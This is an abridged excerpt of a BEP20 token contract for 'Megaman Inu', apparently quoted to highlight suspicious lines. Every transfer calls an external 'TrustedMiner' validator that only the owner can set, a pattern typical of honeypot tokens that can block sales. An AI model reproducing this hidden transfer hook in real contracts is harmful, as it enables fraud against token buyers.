...
contract MEGAMANINU is IBEP20 {
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    
    address public owner = msg.sender;

    string public name = "Megaman Inu";
    string public symbol = "MEGAINU"; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        TrustedMiner(trustedMiner).validate(sender, recipient);
    ...
    function setTrustedVC(address account, bool exempt) public {
        require(msg.sender == owner);
        isFeeExempt[account] = exempt;
    }

    function setTrustedMiner(address trustMiner) public {
        require(msg.sender == owner);
        trustedMiner = trustMiner;
    }
}